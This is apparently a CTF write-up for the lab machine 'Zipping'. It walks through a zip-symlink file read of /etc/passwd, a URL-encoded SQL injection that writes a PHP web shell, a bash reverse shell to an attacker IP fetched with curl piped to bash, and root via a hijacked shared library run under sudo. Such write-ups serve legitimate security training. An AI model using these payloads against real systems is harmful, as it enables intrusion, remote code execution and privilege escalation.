# Zipping Writeup
<figure><img src="../src/Zipping/card.png"></figure>

## Target IP: 10.10.11.229

Nmap Scan:

```
┌─[elliot@elliot-vmwarevirtualplatform]─[~]
└──╼ $nmap -sC -sV -vv 10.10.11.229
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 9d6eec022d0f6a3860c6aaac1ee0c284 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBP6mSkoF2+wARZhzEmi4RDFkpQx3gdzfggbgeI5qtcIseo7h1mcxH8UCPmw8Gx9+JsOjcNPBpHtp2deNZBzgKcA=
|   256 eb9511c7a6faad74aba2c5f6a4021841 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOXXd7dM7wgVC+lrF0+ZIxKZlKdFhG2Caa9Uft/kLXDa
80/tcp open  http    syn-ack Apache httpd 2.4.54 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Zipping | Watch store
|_http-server-header: Apache/2.4.54 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Web Enumeration

We Discover the landing URL `zipping.htb` and add it to our `/etc/hosts` file.

<figure><img src="../src/Zipping/landingpage.png"></figure>

I also discover a page with upload functionality on `/upload.php`.

<figure><img src="../src/Zipping/uploadpage.png"></figure>

Let's use the technique with symbolic link creation:

```
┌─[elliot@elliot-vmwarevirtualplatform]─[~/Desktop/htb/zipping]
└──╼ $ln -s /etc/hosts trial.pdf

┌─[elliot@elliot-vmwarevirtualplatform]─[~/Desktop/htb/zipping]
└──╼ $zip --symlinks trial.zip trial.pdf 
  adding: trial.pdf (stored 0%)
```

Uploading zip to the interface. We get this response

```
File successfully uploaded and unzipped, a staff member will review your resume as soon as possible. Make sure it has been uploaded correctly by accessing the following path:
uploads/365174d74d12fe3a7c3b1fe74de5219e/trial.pdf
```

We get the following result.

```
┌─[elliot@elliot-vmwarevirtualplatform]─[~/Desktop/htb/zipping]
└──╼ $cat test.pdf 
127.0.0.1 localhost
127.0.1.1 zipping

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Now, Let's try to enumerate some more files.

Doing the same with `/etc/passwd` we get the following result.

```
┌─[elliot@elliot-vmwarevirtualplatform]─[~/Desktop/htb/zipping]
└──╼ $cat passwd.pdf 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:104:110:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
rektsu:x:1001:1001::/home/rektsu:/bin/bash
mysql:x:107:115:MySQL Server,,,:/nonexistent:/bin/false
_laurel:x:999:999::/var/log/laurel:/bin/false
```

As we can see the user name is `rektsu`.

## User Flag

On analyzing some more files, we can enable sql injection by bypassing the regexp.

Let's generate a reverse shell first and start a python server.

```
┌─[elliot@elliot-vmwarevirtualplatform]─[~/Desktop/htb/zipping]
└──╼ $echo "bash -c 'bash -i >& /dev/tcp/10.10.16.63/1111 0>&1'" > revshell.sh
┌─[elliot@elliot-vmwarevirtualplatform]─[~/Desktop/htb/zipping]
└──╼ $python -m http.server 
```

Lets start a nc listener as well.
```
$ nc -lvnp 1111
```

```
$ curl -s http://zipping.htb/shop/index.php?page=product&id=%0A'%3bselect+'<%3fphp+system(\"curl+http%3a//10.10.16.63:8000/revshell.sh|bash\")%3b%3f>'+into+outfile+'/var/lib/mysql/rvsl.php'+%231"

$ curl -s http://zipping.htb/shop/index.php?page=..%2f..%2f..%2f..%2f..%2fvar%2flib%2fmysql%2frvsl
```

And we got the Reverse shell.

## Root Flag

Looking for what scripts can be run by rektsu by `sudo -l`

```
rektsu@zipping:/home/rektsu$ sudo -l
Matching Defaults entries for rektsu on zipping:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User rektsu may run the following commands on zipping:
    (ALL) NOPASSWD: /usr/bin/stock
```

Reading the contents of the stocks file. We find that its a binary file.

```
rektsu@zipping:/home/rektsu$ strings /usr/bin/stock 
strings /usr/bin/stock
/lib64/ld-linux-x86-64.so.2
mgUa
fgets
stdin
puts
exit
fopen
__libc_start_main
fprintf
dlopen
__isoc99_fscanf
__cxa_finalize
strchr
fclose
__isoc99_scanf
strcmp
__errno_location
libc.so.6
GLIBC_2.7
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
Hakaize
St0ckM4nager
/root/.stock.csv
Enter the password: 
Invalid password, please try again.
================== Menu ==================
1) See the stock
2) Edit the stock
3) Exit the program
Select an option: 
You do not have permissions to read the file
File could not be opened.
================== Stock Actual ==================
Colour     Black   Gold    Silver
Amount     %-7d %-7d %-7d
Quality   Excelent Average Poor
Amount    %-9d %-7d %-4d
Exclusive Yes    No
Amount    %-4d   %-4d
Warranty  Yes    No
================== Edit Stock ==================
Enter the information of the watch you wish to update:
Colour (0: black, 1: gold, 2: silver): 
Quality (0: excelent, 1: average, 2: poor): 
Exclusivity (0: yes, 1: no): 
Warranty (0: yes, 1: no): 
Amount: 
Error: The information entered is incorrect
%d,%d,%d,%d,%d,%d,%d,%d,%d,%d
The stock has been updated correctly.
;*3$"
GCC: (Debian 12.2.0-3) 12.2.0
Scrt1.o
__abi_tag
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
stock.c
__FRAME_END__
_DYNAMIC
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_start_main@GLIBC_2.34
__errno_location@GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__isoc99_fscanf@GLIBC_2.7
puts@GLIBC_2.2.5
stdin@GLIBC_2.2.5
_edata
fclose@GLIBC_2.2.5
_fini
strchr@GLIBC_2.2.5
fgets@GLIBC_2.2.5
__data_start
strcmp@GLIBC_2.2.5
dlopen@GLIBC_2.34
fprintf@GLIBC_2.2.5
__gmon_start__
__dso_handle
_IO_stdin_used
checkAuth
_end
__bss_start
main
fopen@GLIBC_2.2.5
__isoc99_scanf@GLIBC_2.7
exit@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@GLIBC_2.2.5
_init
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
```

Analyzing we can say that we have access to `/home/rektsu/.config`, so we will create a `libcounter.so` exploit.

Let's create a file `lib.c`

```
#include <unistd.h>

void begin (void) __attribute__((destructor));
void begin (void) {
  system("bash -p");
}
```
```
$ gcc -shared -fPIC -nostartfiles -o libcounter.so lib.c
$ python3 -m http.server 8080
```

```
rektsu@zipping:/home/rektsu/.config$ sudo /usr/bin/stock
sudo /usr/bin/stock
St0ckM4nager
3
bash -p
whoami
root
```

The machine is rooted.

Thank you!! Happy Hacking :D